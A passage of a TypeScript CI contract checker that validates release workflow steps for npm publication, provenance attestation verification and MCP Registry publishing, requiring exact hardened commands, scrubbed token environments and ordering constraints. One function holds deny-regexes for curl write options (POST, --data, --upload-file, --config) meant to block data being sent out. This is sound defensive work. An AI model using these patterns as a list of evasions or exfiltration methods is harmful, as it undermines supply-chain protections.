    configGuardIndex
  );
  const userConfigBindingIndex = verificationRun.indexOf(
    '"NPM_CONFIG_USERCONFIG=$NPM_USERCONFIG"',
    globalConfigBindingIndex
  );
  const downloadIndex = verificationRun.indexOf("NPM_CLI_HTTP_STATUS=$(/usr/bin/env -i", userConfigBindingIndex);
  const sizeIndex = verificationRun.indexOf("NPM_CLI_ACTUAL_SIZE=$(/usr/bin/env -i", downloadIndex);
  const sriIndex = verificationRun.indexOf("NPM_CLI_ACTUAL_SRI=$(/usr/bin/env -i", sizeIndex);
  const pathInventoryIndex = verificationRun.indexOf("if ! NPM_CLI_MEMBERS=$(/usr/bin/env -i", sriIndex);
  const pathInventoryGuardIndex = verificationRun.indexOf(
    "absolute, escaping, or non-package member path",
    pathInventoryIndex
  );
  const typeInventoryIndex = verificationRun.indexOf(
    "if ! NPM_CLI_MEMBER_TYPES=$(/usr/bin/env -i",
    pathInventoryGuardIndex
  );
  const typeInventoryGuardIndex = verificationRun.indexOf(
    "contains a link, device, FIFO, or non-file member",
    typeInventoryIndex
  );
  const extractIndex = verificationRun.indexOf('"$TAR_BIN" --extract --gzip', typeInventoryGuardIndex);
  const embeddedVersionIndex = verificationRun.indexOf("ACTUAL_NPM_CLI_VERSION=", extractIndex);
  const installIndex = verificationRun.indexOf('"$NPM_CLI_JS" install', embeddedVersionIndex);
  const lockIdentityIndex = verificationRun.indexOf(
    '.packages["node_modules/@oomkapwn/enquire-mcp"].integrity',
    installIndex
  );
  const auditIndex = verificationRun.indexOf(NPM_PROVENANCE_AUDIT_COMMAND, lockIdentityIndex);
  const auditCleanEnvIndex = verificationRun.lastIndexOf(`/usr/bin/env -i "\${CLEAN_NPM_ENV[@]}"`, auditIndex);
  const evaluatorIndex = verificationRun.indexOf(NPM_PROVENANCE_EVALUATOR_COMMAND, auditIndex);
  const evaluatorCleanEnvIndex = verificationRun.lastIndexOf(`/usr/bin/env -i "\${CLEAN_ENV[@]}"`, evaluatorIndex);
  const evaluatorModeIndex = verificationRun.indexOf('npm-provenance "$PACKAGE_NAME"', evaluatorIndex);
  const convergenceIndex = verificationRun.indexOf(NPM_PROVENANCE_SUCCESS_CONDITION, evaluatorModeIndex);
  const verifiedOutputIndex = verificationRun.indexOf("printf 'verified=true\\n'", convergenceIndex);
  const allRunBodies = steps.map(runBody).join("\n");
  const verifierWorstCaseSeconds =
    130 + // pinned CLI download
    4 * 35 + // SRI, path inventory, type inventory, and extraction
    610 + // exact consumer install
    8 * (130 + 35) + // signature audit plus semantic evaluator per read-only attempt
    7 * 10; // bounded convergence sleeps
  const verifierReserveCoversWorstCase = 2700 >= verifierWorstCaseSeconds + 300;

  const isExact =
    publishIndex >= 0 &&
    verificationIndex === publishIndex + 1 &&
    draftIndex === verificationIndex + 1 &&
    publishStep?.id === "npm_publication" &&
    verificationStep?.id === "npm_provenance" &&
    Object.entries(contextBindings).every(([name, value]) => publishEnv?.[name] === value) &&
    Object.entries(verifierBindings).every(([name, value]) => verificationEnv?.[name] === value) &&
    publishEnv?.NODE_AUTH_TOKEN === `\${{ secrets.NPM_TOKEN }}` &&
    verificationEnv?.GH_TOKEN === "" &&
    verificationEnv?.GITHUB_TOKEN === "" &&
    verificationEnv?.NODE_AUTH_TOKEN === "" &&
    verificationEnv?.NPM_TOKEN === "" &&
    verificationEnv?.ACTIONS_ID_TOKEN_REQUEST_URL === "" &&
    verificationEnv?.ACTIONS_ID_TOKEN_REQUEST_TOKEN === "" &&
    verificationEnv?.NPM_CLI_VERSION === "11.18.0" &&
    verificationEnv?.NPM_CLI_URL === "https://registry.npmjs.org/npm/-/npm-11.18.0.tgz" &&
    verificationEnv?.NPM_CLI_SRI === NPM_PROVENANCE_CLI_SRI &&
    verificationEnv?.NPM_CLI_SIZE === "2997746" &&
    !JSON.stringify(verificationStep).includes("secrets.") &&
    publishReserveIndex >= 0 &&
    prewriteTagIndex > publishReserveIndex &&
    prewriteReadIndex > prewriteTagIndex &&
    prewriteRehashIndex > prewriteReadIndex &&
    contextIndex > prewriteRehashIndex &&
    attemptedIndex > contextIndex &&
    solePublishIndex > attemptedIndex &&
    publishOutputIndex > solePublishIndex &&
    mutationMatchCount(publishRun, NPM_PROVENANCE_CONTEXT_COMMAND) === 1 &&
    mutationMatchCount(allRunBodies, MCPB_EXACT_NPM_PUBLISH_RUN) === 1 &&
    verifierReserveIndex >= 0 &&
    userConfigIndex > verifierReserveIndex &&
    globalConfigIndex > userConfigIndex &&
    configTouchIndex > globalConfigIndex &&
    configChmodIndex > configTouchIndex &&
    configGuardIndex > configChmodIndex &&
    globalConfigBindingIndex > configGuardIndex &&
    userConfigBindingIndex > globalConfigBindingIndex &&
    downloadIndex > verifierReserveIndex &&
    downloadIndex > userConfigBindingIndex &&
    sizeIndex > downloadIndex &&
    sriIndex > sizeIndex &&
    pathInventoryIndex > sriIndex &&
    pathInventoryGuardIndex > pathInventoryIndex &&
    typeInventoryIndex > pathInventoryGuardIndex &&
    typeInventoryGuardIndex > typeInventoryIndex &&
    extractIndex > typeInventoryGuardIndex &&
    embeddedVersionIndex > extractIndex &&
    installIndex > embeddedVersionIndex &&
    lockIdentityIndex > installIndex &&
    auditCleanEnvIndex > lockIdentityIndex &&
    auditIndex > lockIdentityIndex &&
    auditIndex > auditCleanEnvIndex &&
    evaluatorCleanEnvIndex > auditIndex &&
    evaluatorIndex > auditIndex &&
    evaluatorIndex > evaluatorCleanEnvIndex &&
    evaluatorModeIndex > evaluatorIndex &&
    convergenceIndex > evaluatorModeIndex &&
    verifiedOutputIndex > convergenceIndex &&
    verificationRun.startsWith(
      "set -euo pipefail\nbuiltin unset -v GH_TOKEN GITHUB_TOKEN NODE_AUTH_TOKEN NPM_TOKEN\n" +
        "builtin unset -v ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_ID_TOKEN_REQUEST_TOKEN"
    ) &&
    verificationRun.includes("/usr/bin/env -i PATH=/usr/bin:/bin /usr/bin/mktemp -d") &&
    verificationRun.includes("AWK_BIN=$(type -P awk)") &&
    verificationRun.includes('NPM_USERCONFIG="$VERIFY_ROOT/user.npmrc"') &&
    verificationRun.includes('NPM_GLOBALCONFIG="$VERIFY_ROOT/global.npmrc"') &&
    verificationRun.includes(
      `/usr/bin/env -i "\${CLEAN_ENV[@]}" /usr/bin/touch "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"`
    ) &&
    verificationRun.includes(
      `/usr/bin/env -i "\${CLEAN_ENV[@]}" /bin/chmod 600 "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"`
    ) &&
    verificationRun.includes('[ "$NPM_USERCONFIG" = "$NPM_GLOBALCONFIG" ]') &&
    verificationRun.includes('"NPM_CONFIG_IGNORE_SCRIPTS=true"') &&
    verificationRun.includes('"NPM_CONFIG_PREFER_ONLINE=true"') &&
    verificationRun.includes('"NPM_CONFIG_USERCONFIG=$NPM_USERCONFIG"') &&
    verificationRun.includes('"NPM_CONFIG_GLOBALCONFIG=$NPM_GLOBALCONFIG"') &&
    !verificationRun.includes("NPM_CONFIG_USERCONFIG=/dev/null") &&
    !verificationRun.includes("NPM_CONFIG_GLOBALCONFIG=/dev/null") &&
    verificationRun.includes("--max-filesize 4194304 --retry 0") &&
    verificationRun.includes('[ "$NPM_CLI_ACTUAL_SIZE" != "$NPM_CLI_SIZE" ]') &&
    verificationRun.includes('[ "$NPM_CLI_ACTUAL_SRI" != "$NPM_CLI_SRI" ]') &&
    verificationRun.includes("--list --gzip") &&
    verificationRun.includes("--absolute-names --quoting-style=escape") &&
    verificationRun.includes("$0 !~ /^package\\//") &&
    verificationRun.includes("$0 ~ /(^|\\/)\\.\\.?(\\/|$)/") &&
    verificationRun.includes("$0 ~ /\\/\\//") &&
    verificationRun.includes("$0 ~ /\\\\/") &&
    verificationRun.includes("seen[$0]++") &&
    verificationRun.includes(`/usr/bin/env -i "\${CLEAN_ENV[@]}" "$AWK_BIN"`) &&
    verificationRun.includes("--list --verbose --gzip") &&
    verificationRun.includes("--absolute-names --numeric-owner --quoting-style=escape") &&
    verificationRun.includes('substr($0, 1, 1) != "-"') &&
    verificationRun.includes('substr($0, 1, 1) != "d"') &&
    verificationRun.includes('[ "$ACTUAL_NPM_CLI_VERSION" != "$NPM_CLI_VERSION" ]') &&
    verificationRun.includes(
      "--save-exact --package-lock=true --ignore-scripts --no-audit --no-fund --omit=optional"
    ) &&
    mutationMatchCount(verificationRun, '"$TIMEOUT_BIN" --kill-after=10s 120s "$CURL_BIN"') === 1 &&
    mutationMatchCount(verificationRun, '"$TIMEOUT_BIN" --kill-after=5s 30s') === 5 &&
    mutationMatchCount(verificationRun, '"$TIMEOUT_BIN" --kill-after=10s 600s "$NODE_BIN" "$NPM_CLI_JS" install') ===
      1 &&
    mutationMatchCount(verificationRun, NPM_PROVENANCE_AUDIT_COMMAND) === 1 &&
    mutationMatchCount(verificationRun, NPM_PROVENANCE_EVALUATOR_COMMAND) === 1 &&
    verificationRun.includes("--json --include-attestations --omit=optional --registry=https://registry.npmjs.org/") &&
    verificationRun.includes("--fetch-retries=0 --fetch-timeout=60000 --prefer-online") &&
    mutationMatchCount(verificationRun, '"NPM_CONFIG_PREFER_ONLINE=true"') === 1 &&
    mutationMatchCount(verificationRun, "--prefer-online") === 1 &&
    verificationRun.includes("for (( attempt=1; attempt<=8; attempt++ )); do") &&
    verificationRun.includes('[ "$attempt" -lt 8 ]') &&
    verificationRun.includes("attempt $attempt/8") &&
    verificationRun.includes("/bin/sleep 10") &&
    verifierReserveCoversWorstCase &&
    !/(?:^|\s)(?:npm|"\$NPM_BIN"|\$NPM_BIN)\s+(?:publish|unpublish|dist-tag)\b/mu.test(verificationRun);
  return isExact ? [] : [NPM_PROVENANCE_CONTRACT_PROBLEM];
}

function npmProvenanceEvaluatorProblems(integrity: string): string[] {
  const isExact =
    integrity.includes("export function evaluateNpmProvenanceContext") &&
    integrity.includes("export function evaluateNpmProvenanceAttestations") &&
    integrity.includes('eventName: "push"') &&
    integrity.includes("workflowSha: expectedSourceSha") &&
    integrity.includes("statement.subject.length !== 1") &&
    integrity.includes("subject.name !== expectedPurl || digest.sha512 !== expectedSha512") &&
    integrity.includes("predicateType === NPM_PROVENANCE_IDENTITY.publishPredicateType") &&
    integrity.includes('["publicKey", "tlogEntries", "timestampVerificationData"]') &&
    integrity.includes('["x509CertificateChain", "tlogEntries", "timestampVerificationData"]') &&
    integrity.includes("verified.tlogEntries.length === 0") &&
    integrity.includes("!isRecord(verified.timestampVerificationData)") &&
    integrity.includes("/^SHA256:[A-Za-z0-9+/]{43}$/u.test(publicKey.hint)") &&
    integrity.includes("keyid !== publicKey.hint") &&
    integrity.includes("chain.certificates.length !== 1") &&
    integrity.includes("decodeCanonicalBase64(certificate.rawBytes") &&
    integrity.includes('import { X509Certificate } from "node:crypto";') &&
    integrity.includes("leafCertificate = new X509Certificate(certificateDer);") &&
    integrity.includes(`leafCertificate.subjectAltName !== \`URI:\${expectedSignerUri}\``) &&
    integrity.includes('const FULCIO_GITHUB_ACTIONS_ISSUER = "https://token.actions.githubusercontent.com";') &&
    integrity.includes('const FULCIO_ISSUER_OID_LEGACY = Buffer.from("2b0601040183bf300101", "hex");') &&
    integrity.includes('const FULCIO_ISSUER_OID_V2 = Buffer.from("2b0601040183bf300108", "hex");') &&
    integrity.includes("function readDerElement(bytes, offset, limit, label)") &&
    integrity.includes("function decodeCanonicalDerUtf8String(bytes, label)") &&
    integrity.includes("function assertExactFulcioOidcIssuer(certificateDer, label)") &&
    integrity.includes("lengthOctets === 0 || lengthOctets > 4 || contentStart + lengthOctets > limit") &&
    integrity.includes("bytes[contentStart] === 0") &&
    integrity.includes("contentLength < 128") &&
    integrity.includes("contentEnd > limit") &&
    integrity.includes("value.tag !== 0x0c || value.next !== bytes.length") &&
    integrity.includes('!Buffer.from(decoded, "utf8").equals(encoded)') &&
    integrity.includes("certificate.tag !== 0x30 || certificate.next !== certificateDer.length") &&
    integrity.includes("signatureValue.next !== certificate.contentEnd") &&
    integrity.includes(`\`\${label} TBSCertificate\``) &&
    integrity.includes("field.tag !== 0xa3 || field.next !== tbs.contentEnd") &&
    integrity.includes("extensions.tag !== 0x30 || extensions.next !== field.contentEnd") &&
    integrity.includes("while (cursor < extensions.contentEnd)") &&
    integrity.includes("oid.tag !== 0x06") &&
    integrity.includes("value.tag !== 0x04 || value.next !== extension.contentEnd") &&
    integrity.includes("oidBytes.equals(FULCIO_ISSUER_OID_LEGACY)") &&
    integrity.includes('valueBytes.toString("utf8") !== FULCIO_GITHUB_ACTIONS_ISSUER') &&
    integrity.includes('Buffer.from(FULCIO_GITHUB_ACTIONS_ISSUER, "utf8").equals(valueBytes)') &&
    integrity.includes("oidBytes.equals(FULCIO_ISSUER_OID_V2)") &&
    integrity.includes("decodeCanonicalDerUtf8String(valueBytes") &&
    integrity.includes("legacyIssuerCount > 1") &&
    integrity.includes("v2IssuerCount > 1") &&
    integrity.includes("legacyIssuerCount + v2IssuerCount === 0") &&
    integrity.includes("assertExactFulcioOidcIssuer(certificateDer, label);") &&
    integrity.includes(`\`\${NPM_PROVENANCE_IDENTITY.workflowPath}@refs/tags/\${expected.tag}\``) &&
    integrity.includes("decodeNpmAttestationWrapper(target.attestationBundles[index], index, expectedSignerUri)") &&
    integrity.includes("    expectedSignerUri,\n    label\n  );") &&
    integrity.includes('keyid !== ""') &&
    integrity.includes("statement.predicateType !== item.predicateType") &&
    integrity.includes("report.invalid.length !== 0") &&
    integrity.includes("report.missing.length !== 0") &&
    integrity.includes("report.verified.filter((entry) => entry.name === expected.name)") &&
    integrity.includes("targets.length !== 1") &&
    integrity.includes("target.attestationBundles.length !== 2") &&
    integrity.includes("statements.has(decoded.predicateType)") &&
    integrity.includes("const statement = decodeCanonicalBase64Json") &&
    integrity.includes('assertCanonicalPositiveDecimal(invocationMatch[1], "signed npm provenance run id")') &&
    integrity.includes(
      "expected.publishAttempted && (runId !== expected.currentRunId || runAttempt !== expected.currentRunAttempt)"
    ) &&
    integrity.includes("fresh npm publication provenance does not match the current workflow invocation") &&
    integrity.includes('} else if (mode === "npm-provenance-context")') &&
    integrity.includes('} else if (mode === "npm-provenance")');
  return isExact ? [] : [NPM_PROVENANCE_CONTRACT_PROBLEM];
}

function mcpRegistryEvaluatorProblems(integrity: string): string[] {
  const isExact =
    integrity.includes('import { isDeepStrictEqual } from "node:util";') &&
    integrity.includes('apiBase: "https://registry.modelcontextprotocol.io/v0.1/servers"') &&
    integrity.includes('schema: "https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json"') &&
    integrity.includes("export function evaluateMcpRegistryState(input, phase)") &&
    integrity.includes('phase !== "preflight" && phase !== "convergence"') &&
    integrity.includes("const match = /^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)$/u.exec(value);") &&
    integrity.includes("Array.from(server.description).length > 100\n  )") &&
    mutationMatchCount(integrity, "server.$schema !== MCP_REGISTRY_IDENTITY.schema") === 2 &&
    integrity.includes('transport.type !== "stdio"') &&
    integrity.includes("function assertObservedMcpRegistryServerSchema(server, label)") &&
    mutationMatchCount(integrity, "assertObservedMcpRegistryServerSchema") === 2 &&
    integrity.includes('for (const field of ["runtimeArguments", "packageArguments"])') &&
    integrity.includes("packageEntry.environmentVariables") &&
    integrity.includes("function assertCanonicalExpectedMcpRegistryManifest(server, label)") &&
    integrity.includes(
      '["$schema", "name", "title", "description", "websiteUrl", "repository", "version", "packages"]'
    ) &&
    integrity.includes("packageEntry.runtimeArguments.length !== 2") &&
    integrity.includes('["type", "valueHint", "value", "description", "isRequired", "format"]') &&
    integrity.includes('["type", "name", "description", "isRequired", "format"]') &&
    integrity.includes('assertCanonicalExpectedMcpRegistryManifest(server, "expected local server manifest")') &&
    integrity.includes('assertExactRecord(input, ["expected", "exact", "latest"]') &&
    integrity.includes('["requestUrl", "curlExit", "httpStatus", "contentType", "body"]') &&
    integrity.includes("encodeURIComponent(expected.package.mcpName)") &&
    mutationMatchCount(integrity, "?include_deleted=true") === 2 &&
    integrity.includes('envelope.contentType !== "application/json"') &&
    integrity.includes('envelope.contentType !== "application/problem+json"') &&
    integrity.includes('["detail", "status", "title"]') &&
    integrity.includes('problem.detail !== "Server not found"') &&
    integrity.includes('problem.status !== 404 || problem.title !== "Not Found"') &&
    integrity.includes('["isLatest", "publishedAt", "status", "statusChangedAt"]') &&
    integrity.includes('["active", "deprecated", "deleted"]') &&
    integrity.includes('typeof metadata.isLatest !== "boolean"') &&
    integrity.includes("assertRfc3339Timestamp(metadata.publishedAt") &&
    integrity.includes("assertRfc3339Timestamp(metadata.statusChangedAt") &&
    integrity.includes(
      '(typeof metadata.statusMessage !== "string" || Array.from(metadata.statusMessage).length > 500)\n  )'
    ) &&
    integrity.includes('observation.official.status === "deleted"') &&
    integrity.includes('observation.official.status === "deprecated"') &&
    integrity.includes("!isDeepStrictEqual(exact.server, expected.server)") &&
    integrity.includes("!isDeepStrictEqual(latest.server, expected.server)") &&
    integrity.includes("!isDeepStrictEqual(exact.response, latest.response)") &&
    integrity.includes('phase === "convergence" && (status === 429 || status >= 500)') &&
    integrity.includes('} else if (mode === "mcp-registry-state")') &&
    integrity.includes("evaluateMcpRegistryState(payload, first)");
  return isExact ? [] : [MCP_REGISTRY_EVALUATOR_CONTRACT_PROBLEM];
}

const MCP_REGISTRY_WORK_ROOT_INIT = 'WORK_ROOT=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-mcp-registry.XXXXXX")';
const MCP_REGISTRY_HTTP_WRITE_OUT_ANSI_C = "$'%{http_code}\\n%{content_type}'";

function logicalShellLines(run: string): string[] {
  return run
    .split(/\\\r?\n/u)
    .join("")
    .split("\n")
    .map((line) => line.trim());
}

/**
 * Normalize layout-only spacing for positive inventories after shell
 * continuations have already been joined byte-faithfully for token scans.
 */
function canonicalLogicalShellIdentifierInventory(run: string, identifier: string): string[] {
  return logicalShellLines(run)
    .filter((line) => line.includes(identifier))
    .map((line) => line.split(/[ \t]+/u).join(" "));
}

function conservativeShellLexicalLine(line: string): string {
  return line.split(/["'\\]/u).join("");
}

function rawLogicalNodeTokenInventory(run: string): string[] {
  return logicalShellLines(run).filter((line) => /\bnode\b/u.test(conservativeShellLexicalLine(line)));
}

function hasExactEmptyEnvironmentReference(run: string, environment: Record<string, unknown>): boolean {
  const exactEmptyNames = new Set(
    Object.entries(environment)
      .filter(([, value]) => value === "")
      .map(([name]) => name)
  );
  for (const match of run.matchAll(/[A-Za-z_][A-Za-z0-9_]*/gu)) {
    const name = match[0];
    if (exactEmptyNames.has(name)) return true;
  }
  return false;
}

function ansiCQuoteInventory(run: string): string[] {
  return run.match(/\$'(?:\\[\s\S]|[^'\\])*'/gu) ?? [];
}

const MCP_REGISTRY_CURL_LOGICAL_INVENTORY = [
  "CURL_BIN=$(type -P curl)",
  'response=$(deadline_timeout 35 10 "MCP Registry read" "$CURL_BIN" --disable ' +
    "--silent --show-error --proxy '' --connect-timeout 10 --max-time 30 " +
    "--max-filesize 1048576 --retry 0 --proto '=https' --tlsv1.2 " +
    "--header 'Accept: application/json, application/problem+json' " +
    `--header 'Cache-Control: no-cache' --output "$body_file" --write-out ${MCP_REGISTRY_HTTP_WRITE_OUT_ANSI_C} "$url")`,
  'deadline_timeout 70 10 "MCP publisher download" "$CURL_BIN" --disable --fail ' +
    "--silent --show-error --proxy '' --connect-timeout 10 --max-time 60 " +
    '--max-filesize "$MCP_PUBLISHER_SIZE" --retry 0 --location --max-redirs 1 ' +
    "--proto '=https' --proto-redir '=https' --tlsv1.2 " +
    '--output "$MCP_PUBLISHER_ARCHIVE" "$MCP_PUBLISHER_URL"'
];

const MCP_REGISTRY_NODE_LOGICAL_INVENTORY = [
  "NODE_BIN=$(type -P node)",
  'printf \'%s\' "$payload" | deadline_timeout 15 10 "MCP Registry evaluator" /usr/bin/env -i ' +
    'HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin NODE_TLS_REJECT_UNAUTHORIZED=1 ' +
    '"$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"'
];
const MCP_REGISTRY_RAW_NODE_LOGICAL_INVENTORY = ["NODE_BIN=$(type -P node)"];

/**
 * Conservatively reject literal or commonly shell-composed write tokens across
 * the complete release step. The exact work-root initializer is the sole
 * reviewed non-network use of `-d`; quoted/diagnostic occurrences fail closed.
 */
function hasForbiddenRegistryWriteArguments(run: string): boolean {
  const ansiCQuotes = ansiCQuoteInventory(run);
  if (ansiCQuotes.some((quote) => quote !== MCP_REGISTRY_HTTP_WRITE_OUT_ANSI_C)) return true;
  return logicalShellLines(run).some((line) => {
    if (line === MCP_REGISTRY_WORK_ROOT_INIT) return false;
    const lexicalLine = conservativeShellLexicalLine(line);
    return (
      /(?:(?:--request|--method)(?:=|\s+)|-X\s*)(?:POST|PUT|PATCH|DELETE)\b/iu.test(lexicalLine) ||
      /\$\{[A-Za-z_][A-Za-z0-9_]*(?::?[-=+?])(?:POST|PUT|PATCH|DELETE)\}/iu.test(lexicalLine) ||
      /\$\{[A-Za-z_][A-Za-z0-9_]*(?::?[-=+?])(?:--data(?:-ascii|-binary|-raw|-urlencode)?|--upload-file|--form(?:-string)?|--json|--config|--expand-[A-Za-z0-9-]+)(?=[=}\s])/u.test(
        lexicalLine
      ) ||
      /\$\{[A-Za-z_][A-Za-z0-9_]*(?::?[-=+?])-[A-Za-z0-9#:]*[dFTKX][^}\s]*\}/u.test(lexicalLine) ||
      /(?:^|[\s(=:$])(?:POST|PUT|PATCH|DELETE)(?=[\s);,]|$)/iu.test(lexicalLine) ||
      /(?:^|[\s(=:$])--data(?:-ascii|-binary|-raw|-urlencode)?(?:=|\s)/iu.test(lexicalLine) ||
      /(?:^|[\s(=:$])--upload-file(?:=|\s)/u.test(lexicalLine) ||
      /(?:^|[\s(=:$])-[A-Za-z0-9#:]*[dFTKX]\S*(?=\s|$)/u.test(lexicalLine) ||
      /(?:^|[\s(=:$])(?:--form|--form-string|--json)(?:=|\s)/u.test(lexicalLine) ||
      /(?:^|[\s(=:$])--(?:config|expand-[A-Za-z0-9-]+)(?:=|\s)/u.test(lexicalLine)
    );
  });
}

function mcpRegistryStepProblems(step: YamlRecord | undefined, integrity: string): string[] {
  const run = runBody(step);
  const env = yamlRecord(step?.env);
  const expectedEnv: Record<string, string> = {
    BASH_ENV: "",
    ENV: "",
    SHELLOPTS: "",
    PS4: "",
    LD_PRELOAD: "",
    LD_LIBRARY_PATH: "",
    LD_AUDIT: "",
    LD_DEBUG_OUTPUT: "",
    LD_PROFILE: "",
    GLIBC_TUNABLES: "",
    TAR_OPTIONS: "",
    OPENSSL_CONF: "",
    NODE_DEBUG: "",
    GODEBUG: "",
    NODE_TLS_REJECT_UNAUTHORIZED: "1",
    GH_HOST: "github.com",
    GH_HTTP_UNIX_SOCKET: "",
    HTTPS_PROXY: "",
    HTTP_PROXY: "",
    ALL_PROXY: "",
    CURL_CA_BUNDLE: "",
    SSL_CERT_FILE: "",
    SSL_CERT_DIR: "",
    NODE_EXTRA_CA_CERTS: "",
    NODE_OPTIONS: "",
    GH_TOKEN: `\${{ secrets.GITHUB_TOKEN }}`,
    RELEASE_JOB_DEADLINE_EPOCH: `\${{ steps.deadline.outputs.epoch }}`,
    EXPECTED_VERSION: `\${{ steps.npm_publication.outputs.version }}`,
    EXPECTED_SOURCE_SHA: `\${{ steps.npm_publication.outputs.source_sha }}`,
    EXPECTED_TAG: `\${{ steps.npm_publication.outputs.tag }}`,
    NPM_PROVENANCE_VERIFIED: `\${{ steps.npm_provenance.outputs.verified }}`
  };
  const envIsExact =
    env !== null &&
    JSON.stringify(Object.keys(env).sort()) === JSON.stringify(Object.keys(expectedEnv).sort()) &&
    Object.entries(expectedEnv).every(([key, value]) => env[key] === value);
  const containsExactEmptyEnvironmentReference = hasExactEmptyEnvironmentReference(run, expectedEnv);
  const capturePositiveInteger = (pattern: RegExp) => {
    const value = Number(pattern.exec(run)?.[1] ?? Number.NaN);
    return Number.isSafeInteger(value) && value > 0 ? value : Number.NaN;
  };
  const preparationReserve = capturePositiveInteger(/require_job_reserve ([0-9]+) "MCP publisher preparation"/u);
  const loginReserve = capturePositiveInteger(/require_job_reserve ([0-9]+) "MCP Registry OIDC login"/u);
  const prewriteReserve = capturePositiveInteger(
    /require_job_reserve ([0-9]+) "MCP Registry publish and convergence"/u
  );
  const publishTimeoutMatch = /deadline_timeout ([0-9]+) ([0-9]+) "MCP Registry publish"/u.exec(run);
  const publishTimeoutCap = Number(publishTimeoutMatch?.[1] ?? Number.NaN);
  const publishReserve = Number(publishTimeoutMatch?.[2] ?? Number.NaN);
  const registryReadCap = capturePositiveInteger(/deadline_timeout ([0-9]+) 10 "MCP Registry read"/u);
  const evaluatorCap = capturePositiveInteger(/deadline_timeout ([0-9]+) 10 "MCP Registry evaluator"/u);
  const convergenceWaitCap = capturePositiveInteger(/deadline_timeout ([0-9]+) 10 "MCP Registry convergence wait"/u);
  const ghReadLimit = capturePositiveInteger(/local limit=([0-9]+)/u);
  const timeoutKillGrace = 5;
  const snapshotWorstCase = (registryReadCap + timeoutKillGrace) * 2 + (evaluatorCap + timeoutKillGrace);
  const finalTagProofWorstCase = 3 * (ghReadLimit + timeoutKillGrace);
  const reserveCompositionIsExact =
    preparationReserve === 3300 &&
    loginReserve === 2700 &&
    prewriteReserve === 2200 &&
    publishTimeoutCap === 300 &&
    publishReserve === 1700 &&
    registryReadCap === 35 &&
    evaluatorCap === 15 &&
    convergenceWaitCap === 11 &&
    ghReadLimit === 20 &&
    preparationReserve >=
      70 + timeoutKillGrace + 30 + timeoutKillGrace + 30 + timeoutKillGrace + 180 + timeoutKillGrace + loginReserve &&
    loginReserve >= 180 + timeoutKillGrace + snapshotWorstCase + prewriteReserve &&
    prewriteReserve >= finalTagProofWorstCase + publishTimeoutCap + timeoutKillGrace + publishReserve &&
    publishReserve >= 12 * snapshotWorstCase + 11 * (convergenceWaitCap + timeoutKillGrace) + finalTagProofWorstCase;
  const initialTagIndex = run.indexOf("assert_remote_tag_identity\nPREFLIGHT_RESULT=$(registry_snapshot preflight)");
  const firstReuseTagIndex = run.indexOf(
    'if [ "$PREFLIGHT_ACTION" = "reuse" ]; then\n  assert_remote_tag_identity',
    initialTagIndex
  );
  const preparationIndex = run.indexOf('require_job_reserve 3300 "MCP publisher preparation"', firstReuseTagIndex);
  const validationIndex = run.indexOf('deadline_timeout 180 10 "MCP manifest validation"', preparationIndex);
  const loginIndex = run.indexOf('deadline_timeout 180 10 "MCP Registry OIDC login"', validationIndex);
  const secondPreflightIndex = run.indexOf("SECOND_RESULT=$(registry_snapshot preflight)", loginIndex);
  const secondReuseTagIndex = run.indexOf(
    'if [ "$SECOND_ACTION" = "reuse" ]; then\n  assert_remote_tag_identity',
    secondPreflightIndex
  );
  const prewriteReserveIndex = run.indexOf(
    'require_job_reserve 2200 "MCP Registry publish and convergence"',
    secondReuseTagIndex
  );
  const prewriteSnapshotIndex = run.indexOf("assert_manifest_snapshots", prewriteReserveIndex);
  const prewriteTagIndex = run.indexOf("assert_remote_tag_identity", prewriteSnapshotIndex);
  const publishIndex = run.indexOf('"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"', prewriteTagIndex);
  const convergenceIndex = run.indexOf("for attempt in {1..12}; do", publishIndex);
  const confirmationIndex = run.indexOf(
    'if [ "$MCP_PUBLISH_ATTEMPTED" != "true" ] || [ "$MCP_REGISTRY_CONFIRMED" != "true" ]; then',
    convergenceIndex
  );
  const finalTagIndex = run.indexOf("assert_remote_tag_identity", confirmationIndex);
  const tagProofCalls = (run.match(/^[ \t]*assert_remote_tag_identity[ \t]*$/gmu) ?? []).length;
  const publishCalls = mutationMatchCount(run, '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"');
  const evaluatorInvocation =
    'printf \'%s\' "$payload" | deadline_timeout 15 10 "MCP Registry evaluator" /usr/bin/env -i \\\n' +
    '    HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin NODE_TLS_REJECT_UNAUTHORIZED=1 \\\n' +
    '    "$NODE_BIN" "$EVALUATOR" mcp-registry-state "$phase"';
  const validationInvocation =
    'deadline_timeout 180 10 "MCP manifest validation" /usr/bin/env -i \\\n' +
    '  HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin \\\n' +
    '  "$MCP_PUBLISHER_BIN" validate "$SERVER_JSON_SNAPSHOT"';
  const loginInvocation =
    'deadline_timeout 180 10 "MCP Registry OIDC login" /usr/bin/env -i \\\n' +
    '  HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin \\\n' +
    '  ACTIONS_ID_TOKEN_REQUEST_URL="$ACTIONS_ID_TOKEN_REQUEST_URL" \\\n' +
    '  ACTIONS_ID_TOKEN_REQUEST_TOKEN="$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \\\n' +
    '  "$MCP_PUBLISHER_BIN" login github-oidc --registry=https://registry.modelcontextprotocol.io';
  const publishInvocation =
    'deadline_timeout 300 1700 "MCP Registry publish" /usr/bin/env -i \\\n' +
    '  HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin \\\n' +
    '  "$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"';
  const registryActionBody =
    "registry_action() {\n" +
    '  printf \'%s\' "$1" | $JQ_BIN -er --arg first "$2" --arg second "$3" \\\n' +
    "    '.action | select(. == $first or . == $second)'\n" +
    "}";
  const registryPayloadBindings =
    '--arg exactUrl "$REGISTRY_EXACT_URL" --argjson exactExit "$exact_exit" \\\n' +
